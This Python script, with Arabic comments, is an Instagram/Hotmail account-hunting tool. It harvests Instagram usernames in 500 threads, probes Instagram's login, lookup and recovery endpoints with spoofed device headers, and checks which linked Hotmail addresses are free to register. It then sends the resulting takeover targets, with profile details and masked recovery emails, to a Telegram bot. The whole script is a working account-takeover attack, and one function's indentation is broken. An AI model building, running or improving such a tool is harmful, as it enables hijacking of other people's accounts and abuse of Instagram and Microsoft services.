import time
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('''2026-4-19 12:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('\x1b[38;5;220m ➔ \x1b[38;5;48m تـم ايـقـاف الاداة')
    exit(0)

import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import Fore, Style, init
init(autoreset=True)

try:
    import requests
    import base64
    from uuid import uuid4
    import random
    from faker import Faker
    from ms4 import InfoIG, RestInsta
    import requests
    import time
    import hashlib
    import uuid
    import json
    from secrets import token_hex
    from ms4 import Instagram
    import pycountry
    import random
    import mechanize
    from bs4 import BeautifulSoup
    from user_agent import generate_user_agent
except:
    os.system("pip install ms4 mechanize bs4 uuid requests faker user_agent pycountry")
    os.system("pip install --upgrade ms4")

try:
    from ms4 import UserAgentGenerator
except ImportError:
    os.system("pip install --upgrade ms4")

from ms4 import UserAgentGenerator
import threading
import requests
import random
import requests
import os
import uuid
from secrets import token_hex
import time
from user_agent import generate_user_agent  
from ms4 import Instagram
from requests import get,post
from random import choice,randrange
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import random
import os,requests,sys,time,datetime
import requests
from random import randrange, choice
from faker import Faker
import os
from user_agent import generate_user_agent
fake = Faker()

# الألوان
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
A = '\033[2;34m'
S = '\033[2;36m'
G = '\033[1;34m' 
O = '\x1b[38;5;208m'
U = '\x1b[1;37m'

# المتغيرات العامة
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
hit = 0
gg = 0
bb = 0
go = 0
bm = 0
email = ""

# تغيير النطاق إلى Hotmail
eizon_domain = '@hotmail.com'
TOKEN_FILE = 'tl.txt'

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B} lilvedak
|{F}[+] TeleGram  : {B}@MRX_1wc   |
|{F}[+] Instagram  : {B}Abdo.ma.2 |
|{F}[+] Tool  : {B}متاحات Instagram - Hotmail |
{E}==============================''')

TOKEN = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  : ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F} : ' + Z)
print(X + ' ═════════════════════════════════  ')

def PLAY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @MRX_1wc
 | Instagram Free Tool - Hotmail Edition
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{hit}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} {B} Available IG - متاح   » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD IG - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [4] {A} {A}Good Hotmail - هوتميل صح » 「{go}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [5] {X} {X}BAD - ايميل خاطئ   » 「{bm}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')

def pppp():
    ge = hits               
    bt = bad_insta + bad_email 
    be = good_ig            
    print(f"\r          {B}<|  {C1}True : {M}{ge}  {E} Bad {HH}: {M}{bt}  {W9}False {HH} : {M}{be}    {R}|> \r", end='')

def update_stats():
    pppp()

class Agent:
    @staticmethod
    def user():
        ii = ["165.1.0.29.119", "166.0.0.30.120", "167.0.0.31.121", "168.0.0.32.122"]
        aa = {
            "28/9": ["720dpi", "1080dpi", "1440dpi"],
            "29/10": ["720dpi", "1080dpi", "1440dpi", "2160dpi"],
            "30/11": ["1080dpi", "1440dpi", "2160dpi"],
            "31/12": ["1440dpi", "2160dpi"]
        }
        ss = {
            "720dpi": ["1280x720", "1920x1080"],
            "1080dpi": ["1920x1080", "2560x1440", "3840x2160"],
            "1440dpi": ["2560x1440", "3840x2160"],
            "2160dpi": ["3840x2160", "7680x4320"]
        }
        dd = {
            "samsung": ["SM-T292", "SM-G973F", "SM-A515F"],
            "google": ["Pixel 4", "Pixel 5"],
            "huawei": ["P30 Pro", "Mate 40 Pro"],
            "xiaomi": ["Mi 10", "Redmi Note 10"],
            "oneplus": ["8T", "9 Pro"],
            "sony": ["XZ2", "Xperia 1"]
        }
        cc = ["qcom", "exynos", "kirin", "mediatek", "apple"]
        lan = ["en_US", "es_ES", "fr_FR", "de_DE", "zh_CN", "ja_JP", "ko_KR"]
        dp = ["phone", "tablet", "watch", "tv", "car"]
        arm = ["arm64_v8a", "armeabi-v7a", "x86", "x86_64"]
        comb = ["samsung", "google", "huawei", "xiaomi", "oneplus", "sony"]

        sos = random.choice(list(aa.keys()))
        vlo = random.choice(aa[sos])
        lop = random.choice(ss[vlo])
        ki = random.choice(comb)
        mo = random.choice(dd.get(ki, ["Unknown"]))

        user_agent = (
            f"Instagram {random.choice(ii)} Android "
            f"({sos}; {vlo}; {lop}; {ki}; {mo}; "
            f"{random.choice(arm)}; {random.choice(dp)}; "
            f"{random.choice(lan)}; {random.choice(cc)})"
        )

        return user_agent

class Variable:
    country = [country.numeric for country in pycountry.countries]
    num = random.choice(country)
    sgin = hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest()
    csr = str(token_hex(8) * 2)
    android = f"android-{uuid.uuid4().hex[:16]}"

# استبدال وظيفة فحص Gmail بوظيفة فحص Hotmail
def check_hotmail(email):
    global go, bm
    try:
        if "@hotmail.com" not in email:
            email += "@hotmail.com"

        response = requests.get('https://account.live.com/signup')
        cookies = response.cookies.get_dict()
        amsc = cookies.get('amsc', '')

        canary_match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if not canary_match:
            bm += 1
            PLAY()
            return

        canary = canary_match.group(1).encode('utf-8').decode('unicode_escape')

        url = "https://signup.live.com/API/CheckAvailableSigninNames"
        headers = {"Canary": canary, "Cookie": f"amsc={amsc}"}
        data = {"includeSuggestions": True, "signInName": email}

        response = requests.post(url, headers=headers, data=json.dumps(data)).json()
        
        if response.get("isAvailable") == True:
            go += 1
            info_instagram(email)  # استخدام طريقة جلب معلومات Instagram المحسنة من script1
            PLAY()
        else:
            bm += 1            
            PLAY()
    except Exception as e:
        bm += 1
        PLAY()

# دالة جلب معلومات Instagram المحسنة من script1
def info_instagram(email):
    global hit
    hit += 1
    
    # جلب معلومات الـ reset
    def rest(email):
        rre = email.split('@')[0]
        uh = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
        hr = {
            'X-Pigeon-Session-Id': '2b712457-ffad-4dba-9241-29ea2f472ac5',
            'X-Pigeon-Rawclienttime': '1707104597.347',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-IG-VP9-Capable': 'false',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
            'Accept-Language': 'ar-IQ, en-US',
            'Cookie': 'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '364',
        }
        dah = {
            'signed_body': f'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"{rre}"}}',
            'ig_sig_key_version': '4',
        }
        try:
            k = requests.post(uh, headers=hr, data=dah).text
            return k.split('email":"')[1].split('","status":"ok"}')[0]
        except:
            return False

    # دالة تحديد تاريخ الحساب
    def date(Id):
        try:
            if int(Id) > 1545545 and int(Id) < 1279000:
                return 2010
            elif int(Id) > 1279001 and int(Id) < 17750000:
                return 2011
            elif int(Id) > 17750001 and int(Id) < 279760000:
                return 2012
            elif int(Id) > 279760001 and int(Id) < 900990000:
                return 2013
            elif int(Id) > 900990001 and int(Id) < 1629010000:
                return 2014
            elif int(Id) > 1900000000 and int(Id) < 2500000000:
                return 2015
            elif int(Id) > 2500000000 and int(Id) < 3713668786:
                return 2016
            elif int(Id) > 3713668786 and int(Id) < 5699785217:
                return 2017
            elif int(Id) > 5699785217 and int(Id) < 8507940634:
                return 2018
            elif int(Id) > 8507940634 and int(Id) < 21254029834:
                return 2019
            else:
                return "2020-2023"
        except:
            return False

    res = rest(email)
    username = email.split("@")[0]
    
    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            data = response.json()
            user = data['data']['user']

            user_info = {
                "username": user["username"],
                "Id": user['id'],
                "full_name": user["full_name"],
                "followers": user["edge_followed_by"]["count"],
                "following": user["edge_follow"]["count"],
                "posts": user["edge_owner_to_timeline_media"]["count"],
                "bio": user["biography"],
                "is_private": user["is_private"],
                "is_verified": user["is_verified"],
                "profile_pic_url": user["profile_pic_url"]
            }
            
            Id = user_info['Id']
            full_name = user_info['full_name']
            followers = user_info['followers']
            following = user_info['following']
            posts = user_info['posts']
            bio = user_info['bio']
            is_verified = user_info['is_verified']
            is_private = user_info['is_private']
            profile_pic_url = user_info['profile_pic_url']
            
            tlg = f'''
⋘─────━*MR X*━─────⋙
[💌] Email ==> {email}
[💬] Email Rest ==> {res}
[👻] Username ==> @{username}
[👱🏻] Name ==> {full_name}
[🔺] ID ==> {Id}
[🔁] Followers ==> {followers}
[🔂] Following ==> {following}
[📺] Bio ==> {bio}
[💯] Date ==> {date(Id)}
[🎥] Posts ==> {posts}
[📲] Is Private ==> {is_private}
[✅] Is Verified ==> {is_verified}
[↩️] URL ==> https://www.instagram.com/{username}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @MRX_1wc - Hotmail Edition
'''
        else:
            tlg = f'''
⋘─────━*MR X*━─────⋙
[💌] Email ==> {email}
[💬] Email Rest ==> {res}
[👻] Username ==> @{username}
[↩️] URL ==> https://www.instagram.com/{username}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @MRX_1wc - Hotmail Edition
'''
    except Exception as e:
        tlg = f'''
⋘─────━*MR X*━─────⋙
[💌] Email ==> {email}
[💬] Email Rest ==> {res}
[👻] Username ==> @{username}
[↩️] URL ==> https://www.instagram.com/{username}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @MRX_1wc - Hotmail Edition
'''

    print(F + tlg)
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={tlg}")

    with open('hits.txt', 'a') as f:
        f.write(tlg + '\n')

def Login(email):
    global gg, bb
    tim = str(int(time.time()))
    psw = "qweaszxpo9999##$$"
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"

    payload = "params=%7B%22client_input_params%22%3A%7B%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22sim_phones%22%3A%5B%5D%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22Zt4loQABAAFzGR1YLL2M9XOkL9El%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A1%3A"+tim+"%3A"+psw+"%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22"+email+"%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%226947f919-c7d1-471a-b1b6-56bbd1e5e844%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%225ea5qa%3A135%22%2C%22is_from_empty_password%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22username_text_input_id%22%3A%225ea5qa%3A134%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.2631949000395E13%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"

    headers = {
        'User-Agent': Agent.user(),
        'x-ig-app-locale': "en-US",
        'x-ig-device-locale': "en-US",
        'x-ig-mapped-locale': "en-US",
        'x-pigeon-session-id': "UFS-e075495d-6e46-4687-a0ac-3fb1210b71be-0",
        'x-pigeon-rawclienttime': "1725834678.526",
        'x-ig-bandwidth-speed-kbps': "-1.000",
        'x-ig-bandwidth-totalbytes-b': "0",
        'x-ig-bandwidth-totaltime-ms': "0",
        'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
        'x-ig-www-claim': "0",
        'x-bloks-is-layout-rtl': "true",
        'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
        'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
        'x-ig-android-id': "android-bf1b282ab2b0b445",
        'x-ig-timezone-offset': "10800",
        'x-fb-connection-type': "MOBILE.LTE",
        'x-ig-connection-type': "MOBILE(LTE)",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-app-id': "567067343352427",
        'priority': "u=3",
        'accept-language': "en-US",
        'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
        'ig-intended-user-id': "0",
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-fb-http-engine': "Liger",
        'x-fb-client-ip': "True",
        'x-fb-server-cluster': "True"
    }
    try:
        response = requests.post(url, data=payload, headers=headers).text
        if '"status":"ok"' in response:
            if "The password you entered is incorrect." in response or "Login Error: An unexpected error occurred. Please try logging in again." in response:
                gg += 1
                PLAY()
                check_hotmail(email)
            elif "Please wait a few minutes before you try again." in response:
                AKM(email)
            else:
                bb += 1
                PLAY()
        else:
            bb += 1
            PLAY()
            AKM(email)
    except:
        bb += 1
        PLAY()
        AKM(email)

def AKM(email):
    global gg, bb
    try:
        IG = Instagram.CheckInsta(email)['Is_Available']
        if IG == 'true':
            gg += 1
            check_hotmail(email)
        else:
            bb += 1
    except:
        bb += 1
        pass

def Ch(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/users/lookup/"
    payload = f"signed_body={Variable.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{Variable.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{Variable.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{Variable.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"

 headers = {
            'User-Agent': str(Agent.user()),
            'Accept-Encoding': "gzip, deflate",
            'Content-Type': "application/x-www-form-urlencoded",
            'X-Pigeon-Session-Id': str(uuid.uuid4()),
            'X-Pigeon-Rawclienttime': str("{:.3f}".format(time.time())),
            'X-IG-Connection-Speed': "-1kbps",
            'X-IG-Bandwidth-Speed-KBPS': "-1.000",
            'X-IG-Bandwidth-TotalBytes-B': "0",
            'X-IG-Bandwidth-TotalTime-MS': "0",
            'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
            'X-IG-Connection-Type': "MOBILE(LTE)",
            'X-IG-Capabilities': "3brTvw==",
            'X-IG-App-ID': "567067343352427",
            'Accept-Language': "ar-YE, en-US",
            'X-FB-HTTP-Engine': "Liger",
        }
        try:     
            res = requests.post(url, data=payload, headers=headers).text
            
            if '"status":"ok"' in res and f'{email}' in res:
                gg += 1
                PLAY()
                check_hotmail(email)
            elif '"message":"لم يتم العثور على مستخدمين","status":"fail"' in res:
                bb += 1
                PLAY()
            else:       	
                Login(email)

        except:
            Login(email)

def Ahmed(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
    payload = "params=%7B%22client_input_params%22%3A%7B%22text_input_id%22%3A%22616z6k%3A71%22%2C%22was_headers_prefill_available%22%3A0%2C%22sfdid%22%3A%22%22%2C%22fetched_email_token_list%22%3A%7B%7D%2C%22search_query%22%3A%22"+email+"%22%2C%22android_build_type%22%3A%22release%22%2C%22accounts_list%22%3A%5B%5D%2C%22ig_android_qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22ig_oauth_token%22%3A%5B%5D%2C%22is_whatsapp_installed%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22was_headers_prefill_used%22%3A0%2C%22headers_infra_flow_id%22%3A%22%22%2C%22fetched_email_list%22%3A%5B%5D%2C%22sso_accounts_auth_data%22%3A%5B%5D%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22event_request_id%22%3A%22b8a5a2be-1abe-40da-b476-3d893c871e21%22%2C%22is_from_logged_out%22%3A0%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22waterfall_id%22%3A%22017145b8-cb79-439a-9036-2fb580f40ca0%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.6480220400074E13%2C%22is_platform_login%22%3A0%2C%22context_data%22%3A%22AR2rfU7knJNQCBz3hzsomH487qVyGu0HOVx3jgM-6G69fIwxA73vDmSlV7vY-W2aR4sv08iPPcsbdDt7RQF0ijGeqPudYXN0zlEZMvLeGOEvM_HHTtEJuv8dHDd4c8AIk4VpoaEASAIC9T_OS4yHwzupVtJKe7ghZ7k0y3kHeS7OGhaAIm4QvqfWW5JendkDb0mWJ31hcpuhEp8qcbdjJ27ABYmh7-MltY9OrlgAoBsSZuz8_MD3S1XQFV0I52liYk8fK_tSI9x4Ok0lTmIWJ4aN8pjQvxGhAWLJ73ONhBVfpIXE2xuutHN4eMrjKARC2-XcGRmg7pf3xLfGu_Z7zKiKrVmR8LQz91dwiKHFaND6DeHwVcARkBjYm0YLjaGdT-0FIeGYFs1x%7Carm%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"
    headers = {
        'User-Agent': str(Agent.user()),
        'x-ig-app-locale': "en-US",
        'x-ig-device-locale': "en-US",
        'x-ig-mapped-locale': "en-US",
        'x-pigeon-session-id': "UFS-42175dfd-8675-4443-8f8d-7f09fa7ea9da-0",
        'x-pigeon-rawclienttime': "1725835735.847",
        'x-ig-bandwidth-speed-kbps': "-1.000",
        'x-ig-bandwidth-totalbytes-b': "0",
        'x-ig-bandwidth-totaltime-ms': "0",
        'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
        'x-ig-www-claim': "0",
        'x-bloks-is-layout-rtl': "true",
        'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
        'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
        'x-ig-android-id': "android-bf1b282ab2b0b445",
        'x-ig-timezone-offset': "10800",
        'x-fb-connection-type': "MOBILE.LTE",
        'x-ig-connection-type': "MOBILE(LTE)",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-app-id': "567067343352427",
        'priority': "u=3",
        'accept-language': "en-US",
        'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
        'ig-intended-user-id': "0",
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-fb-http-engine': "Liger",
        'x-fb-client-ip': "True",
        'x-fb-server-cluster': "True"
    }
    try:
        req = requests.post(url, data=payload, headers=headers).text
        
        if '"status":"ok"' in req:
            if "The password you entered is incorrect." in req or "We sent a code to your email. Enter that code to confirm your account." in req:
                gg += 1
                PLAY()
                check_hotmail(email)
            elif "Please wait a few minutes before you try again." in req:
                Ch(email)
            else:
                bb += 1
                PLAY()
        else:
            Ch(email)
    except:
        Ch(email)

# مولد الأسماء الاحترافي المحسن من Script 1
def eizon_python():
    global email
    while True:
        # مجموعة الأحرف المتقدمة والمتنوعة
        g = random.choice([
            'azertyuiopmlkjhgfdsqwxcvbn',
            'azertyuiopmlkjhgfdsqwxcvbn',
            'azertyuiopmlkjhgfdsqwxcvbn',
            'azertyuiopmlkjhgfdsqwxcvbn',
            'azertyuiopmlkjhgfdsqwxcvbn',
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            'abcdefghijklmnopqrstuvwxyzñ',
            'abcdefghijklmnopqrstuvwxyzñ',
            'abcdefghijklmnopqrstuvwxyzñ',
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
            '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
            '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
            '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
            'アイウエオカキクケコサシスセソタチツテトナ ニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'アイウエオカキクケコサシスセソタチツテトナ ニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとな にぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'あいうえおかきくけこさしすせそたちつてとな にぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'אבגדהוזחטיכלמנסעפצקרשת',
            'אבגדהוזחטיכלמנסעפצקרשת',
            'αβγδεζηθικλμνξοπρστυφχψω',
            'αβγδεζηθικλμνξοπρστυφχψω',
            'abcdefghijklmnopqrstuvwxyzç',
            'abcdefghijklmnopqrstuvwxyzç',
            'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
            'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
            'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
        ])
        
        # توليد اسم المستخدم بطريقة متقدمة
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2500000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < 100:  # تخطي الحسابات ذات المتابعين القليل
                    continue
                infoinsta[username] = account
                email = username + eizon_domain  # استخدام hotmail.com
                Ahmed(email)  # استخدام الـ requests الحديثة
        except Exception:
            pass

def get_username():
    global email
    while True:
        try:
            LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))            
            bol = json.dumps({"id": str(random.randrange(10000, 53186034340)), "render_surface": "PROFILE"})         
            response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator),}, data = {"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"})
            username = response.json()['data']['user']['username']     
            
            email = username + "@hotmail.com"  # تغيير من gmail.com إلى hotmail.com   
            Ahmed(email)            
        except:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

# بدء تشغيل حلقة الإحصائيات
Thread(target=stats_loop, daemon=True).start()

# إنشاء التهريدات
threads = []
for i in range(500):  # استخدام مولد الأسماء القوي من Script 1
    t = Thread(target=eizon_python)
    threads.append(t)
    t.start()

# انتظار انتهاء جميع التهريدات
for t in threads:
    t.join()

print(f"{F}[+] تم الانتهاء من تشغيل السكربت بنجاح!")
print(f"{F}[+] إجمالي النتائج: {hit} هت")
print(f"{F}[+] الحسابات المتاحة: {gg}")
print(f"{F}[+] الحسابات غير المتاحة: {bb}")
print(f"{F}[+] إيميلات Hotmail الصحيحة: {go}")
print(f"{F}[+] إيميلات Hotmail الخاطئة: {bm}")







